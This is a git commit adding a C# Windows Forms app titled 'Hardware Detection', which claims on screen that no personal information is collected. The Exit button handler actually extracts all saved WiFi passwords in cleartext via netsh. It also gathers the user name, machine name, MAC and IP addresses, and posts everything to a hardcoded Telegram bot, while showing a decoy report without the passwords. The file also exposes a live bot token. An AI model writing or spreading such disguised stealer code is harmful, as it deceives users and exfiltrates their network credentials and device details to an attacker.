0f97c6f7b2a5e508f310c36600ac1a7782bc73dd
piyum <piyum@CHAMIKA>
2026-02-26 21:28:08 +0530

    Add project files.

---
+++ Hardware Extracter/Form1.Designer.cs
@@ -0,0 +1,153 @@
+﻿namespace Hardware_Extracter
+{
+    partial class Form1
+    {
+        /// <summary>
+        ///  Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///  Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        ///  Required method for Designer support - do not modify
+        ///  the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            btnExit = new Button();
+            label1 = new Label();
+            panel1 = new Panel();
+            label2 = new Label();
+            pictureBox1 = new PictureBox();
+            label3 = new Label();
+            label4 = new Label();
+            panel1.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
+            SuspendLayout();
+            // 
+            // btnExit
+            // 
+            btnExit.Font = new Font("Stencil", 24F, FontStyle.Bold, GraphicsUnit.Point, 0);
+            btnExit.Location = new Point(284, 452);
+            btnExit.Name = "btnExit";
+            btnExit.Size = new Size(183, 52);
+            btnExit.TabIndex = 0;
+            btnExit.Text = "Exit";
+            btnExit.UseVisualStyleBackColor = true;
+            btnExit.Click += btnExit_Click;
+            // 
+            // label1
+            // 
+            label1.AutoSize = true;
+            label1.BackColor = Color.Transparent;
+            label1.FlatStyle = FlatStyle.Flat;
+            label1.Font = new Font("Unispace", 47.9999924F, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 0);
+            label1.ForeColor = Color.Black;
+            label1.Location = new Point(32, 9);
+            label1.Name = "label1";
+            label1.Size = new Size(735, 77);
+            label1.TabIndex = 1;
+            label1.Text = "Hardware Detection";
+            label1.TextAlign = ContentAlignment.TopCenter;
+            // 
+            // panel1
+            // 
+            panel1.BackColor = SystemColors.Control;
+            panel1.Controls.Add(label1);
+            panel1.ForeColor = SystemColors.ControlLight;
+            panel1.Location = new Point(0, 0);
+            panel1.Name = "panel1";
+            panel1.Size = new Size(810, 86);
+            panel1.TabIndex = 2;
+            // 
+            // label2
+            // 
+            label2.AutoSize = true;
+            label2.Font = new Font("Unispace", 14.25F, FontStyle.Bold, GraphicsUnit.Point, 0);
+            label2.ForeColor = SystemColors.ActiveCaptionText;
+            label2.Location = new Point(23, 370);
+            label2.Name = "label2";
+            label2.Size = new Size(754, 46);
+            label2.TabIndex = 3;
+            label2.Text = "We're identifying the hardware and software components on your\ncomputer. No personal information is being collected.";
+            // 
+            // pictureBox1
+            // 
+            pictureBox1.Image = Properties.Resources.ff;
+            pictureBox1.Location = new Point(231, 106);
+            pictureBox1.Name = "pictureBox1";
+            pictureBox1.Size = new Size(290, 235);
+            pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
+            pictureBox1.TabIndex = 4;
+            pictureBox1.TabStop = false;
+            // 
+            // label3
+            // 
+            label3.AutoSize = true;
+            label3.Font = new Font("Segoe UI", 11.25F, FontStyle.Bold, GraphicsUnit.Point, 0);
+            label3.Location = new Point(679, 505);
+            label3.Name = "label3";
+            label3.Size = new Size(109, 20);
+            label3.TabIndex = 5;
+            label3.Text = "Version 1.00.1";
+            // 
+            // label4
+            // 
+            label4.AutoSize = true;
+            label4.Location = new Point(0, 509);
+            label4.Name = "label4";
+            label4.Size = new Size(135, 15);
+            label4.TabIndex = 6;
+            label4.Text = "Developed by : Chamika";
+            // 
+            // Form1
+            // 
+            AutoScaleDimensions = new SizeF(7F, 15F);
+            AutoScaleMode = AutoScaleMode.Font;
+            BackColor = SystemColors.ControlDarkDark;
+            ClientSize = new Size(800, 534);
+            Controls.Add(label4);
+            Controls.Add(label3);
+            Controls.Add(pictureBox1);
+            Controls.Add(label2);
+            Controls.Add(panel1);
+            Controls.Add(btnExit);
+            ForeColor = SystemColors.ActiveCaptionText;
+            Icon = (Icon)resources.GetObject("$this.Icon");
+            Name = "Form1";
+            Text = "Hardware Detection";
+            TransparencyKey = Color.Yellow;
+            Load += Form1_Load;
+            panel1.ResumeLayout(false);
+            panel1.PerformLayout();
+            ((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
+            ResumeLayout(false);
+            PerformLayout();
+        }
+
+        #endregion
+
+        private Button btnExit;
+        private Label label1;
+        private Panel panel1;
+        private Label label2;
+        private PictureBox pictureBox1;
+        private Label label3;
+        private Label label4;
+    }
+}
---
+++ Hardware Extracter/Form1.cs
@@ -0,0 +1,213 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Management;
+using System.Net.Http;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+using System.Text;
+using System.Text.Json;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using LibreHardwareMonitor.Hardware;
+
+[assembly: System.Runtime.Versioning.SupportedOSPlatform("windows")]
+
+namespace Hardware_Extracter
+{
+    public partial class Form1 : Form
+    {
+        private const string BotToken = "8681588899:AAHDU4O6S1YwXaEdYFtmk6fQMKxow9CfXAY";
+        private const string ChatId = "1661811728";
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        // Fixes the "Form1_Load does not exist" error
+        private void Form1_Load(object sender, EventArgs e) { }
+
+        private async void btnExit_Click(object sender, EventArgs e)
+        {
+            if (sender is Button btn) btn.Enabled = false;
+
+            try
+            {
+                var hardwareData = GetHardwareInfo();
+                var wifiSecrets = GetWifiDetails();
+
+                StringBuilder sb = new StringBuilder();
+                sb.AppendLine("🚀 *Full Hardware & WiFi Report*");
+                sb.AppendLine("----------------------------");
+                sb.AppendLine($"*User*: `{Environment.UserName}`");
+                sb.AppendLine($"*PC Name*: `{Environment.MachineName}`");
+                sb.AppendLine("----------------------------");
+
+                foreach (var entry in hardwareData)
+                    sb.AppendLine($"*{entry.Key}*: `{entry.Value}`");
+
+                sb.AppendLine("\n🔑 *WiFi Passwords*:");
+                if (wifiSecrets.Count > 0)
+                {
+                    foreach (var wifi in wifiSecrets) sb.AppendLine($"> `{wifi}`");
+                }
+                else
+                {
+                    sb.AppendLine("_No profiles found (Requires Admin)_");
+                }
+
+                await SendToTelegram(sb.ToString());
+
+                string htmlPath = GenerateHtmlReport(hardwareData);
+                Process.Start(new ProcessStartInfo(htmlPath) { UseShellExecute = true });
+
+                await Task.Delay(2000);
+                Environment.Exit(0);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Error: " + ex.Message);
+                if (sender is Button b) b.Enabled = true;
+            }
+        }
+
+        private Dictionary<string, string> GetHardwareInfo()
+        {
+            var info = new Dictionary<string, string>();
+            info["CPU"] = GetWmiValue("Win32_Processor", "Name");
+            info["GPU"] = GetWmiValue("Win32_VideoController", "Name");
+            info["OS"] = GetWmiValue("Win32_OperatingSystem", "Caption");
+
+            // RAM Info
+            try
+            {
+                long memBytes = 0;
+                using (var searcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory"))
+                    foreach (var obj in searcher.Get()) memBytes += Convert.ToInt64(obj["Capacity"]);
+                info["Total RAM"] = $"{(memBytes / 1024 / 1024 / 1024)} GB";
+            }
+            catch { }
+
+            // CPU Usage, CPU Temp, and GPU Temp (Requires Admin via Manifest)
+            try
+            {
+                Computer computer = new Computer { IsCpuEnabled = true, IsGpuEnabled = true };
+                computer.Open();
+                foreach (var hardware in computer.Hardware)
+                {
+                    hardware.Update();
+                    foreach (var sensor in hardware.Sensors)
+                    {
+                        if (hardware.HardwareType == HardwareType.Cpu)
+                        {
+                            if (sensor.SensorType == SensorType.Load && sensor.Name.Contains("Total"))
+                                info["CPU Usage"] = $"{sensor.Value:F1}%";
+                            if (sensor.SensorType == SensorType.Temperature && sensor.Name.Contains("Package"))
+                                info["CPU Temp"] = $"{sensor.Value:F1}°C";
+                        }
+                        if (hardware.HardwareType == HardwareType.GpuNvidia || hardware.HardwareType == HardwareType.GpuAmd)
+                        {
+                            if (sensor.SensorType == SensorType.Temperature && sensor.Name.Contains("Core"))
+                                info["GPU Temp"] = $"{sensor.Value:F1}°C";
+                        }
+                    }
+                }
+                computer.Close();
+            }
+            catch { }
+
+            AddNetworkDetails(info);
+            return info;
+        }
+
+        private List<string> GetWifiDetails()
+        {
+            List<string> wifiList = new List<string>();
+            try
+            {
+                Process p = new Process { StartInfo = new ProcessStartInfo("netsh", "wlan show profiles") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } };
+                p.Start();
+                string output = p.StandardOutput.ReadToEnd();
+                p.WaitForExit();
+
+                foreach (string line in output.Split('\n'))
+                {
+                    if (line.Contains("All User Profile"))
+                    {
+                        string name = line.Split(':')[1].Trim().Replace("\r", "");
+                        Process kp = new Process { StartInfo = new ProcessStartInfo("netsh", $"wlan show profile name=\"{name}\" key=clear") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } };
+                        kp.Start();
+                        string kOut = kp.StandardOutput.ReadToEnd();
+                        kp.WaitForExit();
+
+                        foreach (string kLine in kOut.Split('\n'))
+                            if (kLine.Contains("Key Content")) wifiList.Add($"{name}: {kLine.Split(':')[1].Trim()}");
+                    }
+                }
+            }
+            catch { }
+            return wifiList;
+        }
+
+        private void AddNetworkDetails(Dictionary<string, string> info)
+        {
+            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
+            {
+                if ((ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet || ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
+                    && ni.OperationalStatus == OperationalStatus.Up)
+                {
+                    info["Network Adapter"] = ni.Description;
+                    info["MAC Address"] = ni.GetPhysicalAddress().ToString();
+                    int v4 = 1, v6 = 1;
+                    foreach (var ip in ni.GetIPProperties().UnicastAddresses)
+                    {
+                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
+                            info[$"IPv4 Address {v4++}"] = ip.Address.ToString();
+                        else if (ip.Address.AddressFamily == AddressFamily.InterNetworkV6)
+                            info[$"IPv6 Address {v6++}"] = ip.Address.ToString();
+                    }
+                    break;
+                }
+            }
+        }
+
+        private string GetWmiValue(string table, string property)
+        {
+            try
+            {
+                using (var searcher = new ManagementObjectSearcher($"SELECT {property} FROM {table}"))
+                    foreach (var obj in searcher.Get()) return obj[property]?.ToString() ?? "N/A";
+            }
+            catch { }
+            return "Unknown";
+        }
+
+        private async Task SendToTelegram(string message)
+        {
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    string url = $"https://api.telegram.org/bot{BotToken}/sendMessage";
+                    var payload = new { chat_id = ChatId, text = message, parse_mode = "Markdown" };
+                    await client.PostAsync(url, new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json"));
+                }
+            }
+            catch { }
+        }
+
+        private string GenerateHtmlReport(Dictionary<string, string> data)
+        {
+            StringBuilder sb = new StringBuilder();
+            sb.AppendLine("<html><head><style>body{font-family:sans-serif;background:#0f172a;color:white;padding:20px;}table{width:100%;border-collapse:collapse;}th,td{padding:10px;border:1px solid #334155;}th{background:#3b82f6;}</style></head><body>");
+            sb.AppendLine("<h2>Hardware Report</h2><table><tr><th>Component</th><th>Detail</th></tr>");
+            foreach (var entry in data) sb.AppendLine($"<tr><td>{entry.Key}</td><td>{entry.Value}</td></tr>");
+            sb.AppendLine("</table></body></html>");
+            string path = Path.Combine(Path.GetTempPath(), "Report.html");
+            File.WriteAllText(path, sb.ToString());
+            return path;
+        }
+    }
+}
